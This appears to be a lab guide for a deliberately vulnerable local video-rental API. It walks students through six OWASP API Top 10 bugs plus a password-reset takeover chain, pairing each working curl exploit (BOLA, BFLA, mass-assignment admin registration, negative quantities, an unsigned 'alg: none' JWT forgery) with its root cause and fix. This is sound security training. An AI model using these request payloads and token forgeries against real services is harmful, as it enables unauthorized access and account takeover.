# FreeTime Video Hire BBS — Lab Guide

Six bugs, each mapped to an OWASP API Security Top 10 category. Work
through them in order, capture the flag, and note the exact line of
code responsible.

Start the lab: `./start.sh`. Confirm it's alive:
```bash
curl http://localhost:8000/api/health
```

Log in as guest and save the token:
```bash
TOKEN=$(curl -s -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"guest","password":"guest"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
```

---

## Challenge 1 — BOLA

**Goal:** As guest, read admin's profile (id 1) and recover their balance/email.
```bash
curl -s http://localhost:8000/api/v1/users/1 -H "Authorization: Bearer $TOKEN"
```
**Root cause:** `get_user` in `app/main.py` never compares `user_id` to `auth["sub"]`.
**Fix:** `if int(auth["sub"]) != user_id and not auth["is_admin"]: raise 403`.

---

## Challenge 2 — BFLA

**Goal:** As guest, list all users and delete one via the admin-only endpoints.
```bash
curl -s http://localhost:8000/api/v1/admin/users -H "Authorization: Bearer $TOKEN"
curl -s -X DELETE http://localhost:8000/api/v1/admin/users/3 -H "Authorization: Bearer $TOKEN"
```
**Root cause:** every `/admin/*` route depends only on `get_current_user`,
which proves the token decodes but never checks `auth["is_admin"]`.
**Fix:** a `require_admin` dependency that 403s when `is_admin` is falsy.

---

## Challenge 3 — BOPLA / Excessive Data Exposure

**Goal:** Pull the entire movie table in one shot past the intended page size.
```bash
curl -s "http://localhost:8000/api/v1/movies?limit=9999" | python3 -m json.tool
curl -s "http://localhost:8000/api/v1/movies?limit=-1"
```
**Root cause:** `list_movies(limit: int = 50)` passes the client value
straight into `.limit(limit)` with no ceiling or floor.
**Fix:** `limit = max(1, min(limit, 20))` server-side.

---

## Challenge 4 — Mass Assignment

**Goal:** Self-register as a brand-new admin with a huge balance, no
login as admin required.
```bash
curl -s -X POST http://localhost:8000/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","email":"hacker@freetime.video","password":"pwned123","is_admin":true,"balance":9999}'
```
Log in as `hacker`/`pwned123` and confirm:
```bash
HTOKEN=$(curl -s -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"pwned123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
curl -s http://localhost:8000/api/v1/admin/users -H "Authorization: Bearer $HTOKEN"
```
**Root cause:** `RegisterReq` includes `is_admin`/`balance` fields that
get written straight to the new `User` row with no allowlist.
**Fix:** drop those fields from the public registration schema entirely;
only an authenticated admin route should ever set them.

---

## Challenge 5 — Unrestricted Resource Consumption

**Goal:** Rent a movie with a negative quantity, then an absurd one.
```bash
curl -s -X POST http://localhost:8000/api/v1/rentals \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"movie_id": 1, "qty": -10}'

curl -s -X POST http://localhost:8000/api/v1/rentals \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"movie_id": 1, "qty": 999999}'
```
Check the movie's stock afterward — it should be deeply negative:
```bash
curl -s http://localhost:8000/api/v1/movies/1
```
**Root cause:** `create_rental` does `movie.stock = movie.stock - req.qty`
with no bound on `qty`, no check against current stock, and no real
balance deduction/verification.
**Fix:** enforce `0 < qty <= movie.stock`, verify and deduct the user's
balance atomically, reject negative or zero quantities outright.

---

## Challenge 6 — Forged JWT (weak secret + `alg: none`)

**Goal:** Without ever logging in as admin, forge an admin token and
hit the BFLA endpoint from Challenge 2.
```bash
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n '{"sub":"1","username":"admin","is_admin":true}' | base64 | tr -d '=' | tr '/+' '_-')
FORGED="$HEADER.$PAYLOAD."
curl -s http://localhost:8000/api/v1/admin/users -H "Authorization: Bearer $FORGED"
```
**Root cause:** `auth.py`'s `decode_token` passes
`algorithms=["HS256", "none"]`, so an unsigned token is accepted. The
hardcoded secret `freetime1985` is also weak enough to brute-force
offline if `none` weren't available.
**Fix:** only allow `["HS256"]`, load the secret from a real secrets
store, and consider RS256 with a proper key pair.

---

## Bonus chain — full admin account takeover via password reset

This combines the mail server with the mass-assignment bug to show a
more realistic attacker path than forging tokens directly.

1. Trigger a reset for the real admin account:
   ```bash
   curl -s -X POST http://localhost:8000/api/v1/auth/forgot-password \
     -H "Content-Type: application/json" \
     -d '{"email":"admin@email.freetime.video"}'
   ```
2. Open **http://localhost:8025** (MailHog's web UI) — the reset email
   is sitting there in the sandbox inbox, since nothing in this lab
   authenticates SMTP senders or recipients. Open it and copy the
   `token=` value from the reset link.
3. Reset admin's password to something you know:
   ```bash
   curl -s -X POST http://localhost:8000/api/v1/auth/reset-password \
     -H "Content-Type: application/json" \
     -d '{"token":"PASTE_TOKEN_HERE","new_password":"owned123"}'
   ```
4. Log in as admin for real, with full, unforged, legitimate access:
   ```bash
   curl -s -X POST http://localhost:8000/api/v1/auth/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"owned123"}'
   ```

**Root cause (for discussion):** this isn't a single CWE so much as a
lab design point — a real reset flow depends on the email channel being
hard for an attacker to intercept. Here the "mail server" is a local
sandbox with no inbox-ownership check at all, so anyone who can trigger
a reset can also read it. In production this maps to "insecure password
recovery" (part of Broken Authentication) rather than one of the six
primary bugs above.

---

## Wrap-up

For each challenge, write a short remediation note: the exact line of
code at fault, the correct check, and the OWASP API Top 10 category it
maps to. Reset with `docker compose down -v && ./start.sh` before
handing the lab to the next student.
